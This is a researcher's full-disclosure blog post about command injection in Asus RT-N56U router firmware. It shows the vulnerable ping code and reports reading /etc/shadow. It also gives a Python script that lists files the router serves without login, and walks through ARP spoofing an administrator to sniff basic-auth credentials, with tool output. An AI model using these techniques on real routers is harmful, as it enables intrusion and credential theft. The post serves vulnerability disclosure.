---
categories:
- command injection
- asus
comments: false
date: "2013-06-05T22:45:20Z"
title: Asus RT56U Remote Command Injection
---

After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more.

I was running 3.0.0.4.342, which happens to be one version behind the latest (3.0.0.4.360), so I did a sweep of both.  I enabled telnet on the router and hunted around, which led me to an unlinked page, Main_Analysis_Content.asp.  This page hosts a slew of diagnostic tools, including the ability to ping network systems.  See where this is going?

{{< figure class="center" src="http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg" >}}

And the related source code to this:

```
document.form.SystemCmd.value = "ping -c " + document.form.pingCNT.value + " " + document.form.destIP.value;
```

Pretty trivial, and each command, ping, nslookup, and traceroute, is vulnerable.  The system is running an HTTP web server that serves up ASP pages, so we could wget and deploy a reverse ASP shell or set up a netcat listener.

I then took a look at the latest firmware, which touts the following changes:

```
ASUS RT-N56U Firmware Version 3.0.0.4.360
1. AiCloud
For iOS user, please upgrade app to 1.02.78 or above
(for more information, please refer to http://event.asus.com/2012/nw/aicloud/index.htm)
2. Network tools in Advanced setting
3. WOL user interface
4. H.323 and SIP passthrough can be disabled in Advanced Settings --> WAN -->NAT Passthrough
5. Click the device name and lookup the manufacturer information
6. Change the DHCP query frequency in Advanced settings-->WAN-->Internet connection to resolve the ISP compatibility issue.
```

So it looks like the tools were added in the .342 (or earlier) firmware, but not actually linked until the .360 release.  I then flashed over the firmware to take a look at any changes.  It appeared they added a Network Tools section which, of course, allows us to:

{{< figure class="center" src="http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg" >}}

It's kind of ridiculous that we can hit /etc/shadow with this.

As an aside, I thought about what sort of files might be accessible without authenticating to the web server.  Seeing as I had access to enumerate the file system, I constructed a listing of every file in the web server's root.  The code can be seen below:

```
import urllib, urllib2

def get_files():
    files = []
    with open('files_rt.txt', 'r') as f:
        files = [x.strip() for x in f.readlines()]
    print '[!] Built %d files to test...'%len(files)
    return files

def run():
    files        = get_files()
    open_files   = []

    for f in files:
        url = 'http://192.168.1.1/'+f
        try:
            data = urllib2.urlopen(url).read()
        except urllib2.HTTPError as e:
            continue

        open_files.append(url)

    print '[!] %d exposed files'%len(open_files)
    for f in open_files: print '\t[!] %s'%f

def parse_args():
    pass

if __name__ == "__main__":
    run()
```

When run, 42 files were exposed:

```
bryan@devbox:~$ python rt56u_iter.py 
[!] Built 277 files to test...
[!] 42 exposed files
    [!] http://192.168.1.1/NM_style.css
    [!] http://192.168.1.1/Nologin.asp
    [!] http://192.168.1.1/PIE.htc
    [!] http://192.168.1.1/ParentalControl.css
    [!] http://192.168.1.1/WAN_info.asp
    [!] http://192.168.1.1/app_installation.css
    [!] http://192.168.1.1/detect_firmware.asp
    [!] http://192.168.1.1/error_page.htm
    [!] http://192.168.1.1/fan.svg
    [!] http://192.168.1.1/form_style.css
    [!] http://192.168.1.1/get_webdavInfo.asp
    [!] http://192.168.1.1/gotoHomePage.htm
    [!] http://192.168.1.1/httpd_check.htm
    [!] http://192.168.1.1/index_style.css
    [!] http://192.168.1.1/jquery.js
    [!] http://192.168.1.1/menu_style.css
    [!] http://192.168.1.1/other.css
    [!] http://192.168.1.1/pwdmeter.css
    [!] http://192.168.1.1/remote.asp
    [!] http://192.168.1.1/tm.svg
    [!] http://192.168.1.1/tmmenu.css
    [!] http://192.168.1.1/update_applist.asp
    [!] http://192.168.1.1/update_appstate.asp
    [!] http://192.168.1.1/update_cloudstatus.asp
    [!] http://192.168.1.1/ure_success.htm
    [!] http://192.168.1.1/ureip.asp
    [!] http://192.168.1.1/usp_style.css
    [!] http://192.168.1.1/aidisk/AiDisk_style.css
    [!] http://192.168.1.1/aidisk/aidisk.css
    [!] http://192.168.1.1/device-map/device-map.css
    [!] http://192.168.1.1/iui/Button_low.jpg
    [!] http://192.168.1.1/iui/check.png
    [!] http://192.168.1.1/iui/default-theme.css
    [!] http://192.168.1.1/iui/iui.css
    [!] http://192.168.1.1/iui/listArrow.png
    [!] http://192.168.1.1/iui/listArrow_setting.png
    [!] http://192.168.1.1/iui/toolButton.png
    [!] http://192.168.1.1/calendar/fullcalendar.css
    [!] http://192.168.1.1/svghtc/svg.htc
    [!] http://192.168.1.1/svghtc/svg.swf
    [!] http://192.168.1.1/qis/qis_style.css
    [!] http://192.168.1.1/qis/qis_style_m.css
```

A majority of the files are pretty useless/uninteresting, such as the css/jpg/png files, but a couple of the ASP files have some interesting information.  `Nologin.asp` lets us know every address the DHCP server has leased out, as well as the IP of the currently logged in administrator.  `get_webdavInfo.asp` gives us a bunch of great info, including the firmware version, DDNS information, mode of operation, and more.

The only really interesting page to me is `Nologin.asp`.  This gives us the currently logged in administrator; so, if we're on the local network, we can generate a short script that periodically pings the router and alerts us when an admin logs in.  We can then ARPP the administrator and hijack the password; this works because the router's web server doesn't do any session management, it simply uses basic HTTP auth to send the base64'd password.  

Observe:

{{< figure class="center" src="http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg" >}}

Now we know where the administrator is logged in.  We can now ARPP the host and hijack the password.  It is unnecessary for the administrator to actually be doing anything, because conveniently the client's browser sends out an ajax request to `/ajax_status.asp` quite often, complete with authentication credentials.  Using zarp, a network attack tool designed by yours truly, we can ARPP the admin and set up a password sniffer:

```
    [Running sessions]
[1] ARP Spoof
    [0] 192.168.1.219
[2] Password Sniffer
    [0] 192.168.1.219


    [1] Stop session
    [2] View session
    [3] Start session logger
    [4] Stop session logger

0) Back
> 2
[module] [number]> 2 0
[!] [enter] when finished
[!] Dumping output from 'Password Sniffer'...
[!] Host: 192.168.1.1
[!] User: admin:*********
```

Immediately we catch a heartbeat and grab the password (edited out). 

Lastly, this is full disclosure.  Check out [this](http://seclists.org/fulldisclosure/2013/Mar/126) listing for how Asus treats security researchers.
